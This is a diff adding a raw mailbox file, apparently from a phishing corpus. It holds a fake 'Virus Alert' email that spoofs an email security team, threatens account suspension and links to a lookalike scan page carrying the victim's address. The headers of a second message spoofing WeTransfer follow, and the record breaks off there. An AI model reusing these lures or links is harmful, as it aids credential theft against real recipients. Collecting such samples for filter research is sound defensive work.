@@ -1,0 +1,78 @@
+From: monkey.org<securityalert@postmaster.net>
+To: jose@monkey.org
+Subject: Virus Detected - jose@monkey.org
+Date: 26 Sep 2019 11:44:23 -0700
+Message-ID: <20190926114422.7B1FE2C19B2717D2@postmaster.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 184
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.18052"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P>
+<table>
+<TBODY>
+<TR>
+<td width=3D"10"></TD>
+<td>
+<table style=3D"WIDTH: 780px">
+<TBODY>
+<TR>
+<td style=3D"HEIGHT: 50px; PADDING-BOTTOM: 30px; PADDING-TOP: 30px; PADDING=
+-LEFT: 30px; PADDING-RIGHT: 30px; BACKGROUND-COLOR: #0174df; -moz-border-ra=
+dius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-ra=
+dius: 5px"><FONT color=3D#fff size=3D+3 face=3Dverdana>Virus Alert!!! </FON=
+T><BR><BR><FONT color=3D#fff size=3D2 face=3Dverdana>Dear jose@monkey.org, =
+Virus has been detected in your email account. </FONT></TD></TR>
+<TR>
+<td style=3D"HEIGHT: 5px"></TD></TR>
+<TR>
+<td style=3D"HEIGHT: 50px; PADDING-BOTTOM: 30px; PADDING-TOP: 30px; PADDING=
+-LEFT: 30px; PADDING-RIGHT: 30px; BACKGROUND-COLOR: #e6e6e6; -moz-border-ra=
+dius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-ra=
+dius: 5px"><FONT size=3D2 face=3Dverdana>Our spider detected deadly Trojans=
+ in your <FONT color=3D#ff0000>jose@monkey.org</FONT></FONT>
+<P><FONT color=3D#000 size=3D2 face=3Dverdana>To keep your account safe, pl=
+ease click below to run a quick email scan. <BR><BR><FONT size=3D2 face=3Dv=
+erdana><B><A href=3D"http://akcosm&eacute;tica.com/js.php?email=3Djose@monk=
+ey.org">Quick scan jose@monkey.org now! </A></B></FONT><BR><BR><B>Note:</B>=
+ If you ignore this notice, your account will be suspended without further =
+notice to protect our server from further damage. <BR><BR><BR>Source: <B>Em=
+ail Security Team</B> </FONT></P></TD></TR>
+<TR>
+<td style=3D"HEIGHT: 5px"></TD></TR>
+<TR>
+<td style=3D"HEIGHT: 40px; PADDING-BOTTOM: 30px; PADDING-TOP: 30px; PADDING=
+-LEFT: 30px; PADDING-RIGHT: 30px; BACKGROUND-COLOR: #0174df; -moz-border-ra=
+dius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-ra=
+dius: 5px"><FONT color=3D#fff size=3D2 face=3Dverdana>This is an auto-gener=
+ated message sent to: <B>jose@monkey.org</B> <BR>Do not reply this mail bec=
+ause Replies sent to Mail Server will not be received or replied. </FONT></=
+TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></P></BODY>
+</HTML>
+
+From jose@monkey.org Wed Oct  2 13:52:04 2019 +0000
+Return-Path: noreply@we-transfer.com
+Delivered-To: jose@monkey.org
+X-FDA: 75998983368.40.unit08_2f25b319d7f1d
+X-Spam-Summary: 50,0,0,04587c1a72042908,d41d8cd98f00b204,noreply@we-transfer.com,:,RULES_HIT:2:41:72:355:375:379:495:800:962:967:973:983:988:989:1021:1189:1208:1224:1260:1263:1311:1313:1314:1345:1381:1431:1433:1434:1436:1437:1513:1515:1516:1517:1521:1535:1560:1571:1588:1589:1593:1594:1714:1730:1747:1777:1792:2084:2198:2199:2393:2525:2527:2549:2553:2557:2560:2563:2682:2685:2693:2828:2859:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3867:3870:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4051:4120:4321:5007:6117:6119:6261:6669:6674:7903:8599:8603:8957:9025:9344:9388:9466:10004:10346:11026:11473:11657:11658:11914:12043:12219:12297:12438:12517:12519:12555:12679:12740:12895:12903:12955:12986:13139:13439:14096:21080:21433:21451:21483:21524:21554:21627:21810:21819:30054:30070:30090,0,RBL:162.144.45.170:@we-transfer.com:.lbl8.mailshell.net-62.8.0.100 64.201.201.201,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL
+X-HE-Tag: unit08_2f25b319d7f1d
+X-Filterd-Recvd-Size: 9995
+Received: from greeceagentholidays.com (unknown [162.144.45.170])
+	by imf12.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Wed,  2 Oct 2019 13:52:03 +0000 (UTC)
+Received: from ec2-54-190-245-115.us-west-2.compute.amazonaws.com ([54.190.245.115]:54474 helo=we-transfer.com)
+	by server.beepdenturesarcade.com with esmtpsa (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256)
+	(Exim 4.92)
+	(envelope-from <noreply@we-transfer.com>)
+	id 1iFf2v-00012L-W8
+	for jose@monkey.org; Wed, 02 Oct 2019 13:52:02 +0000
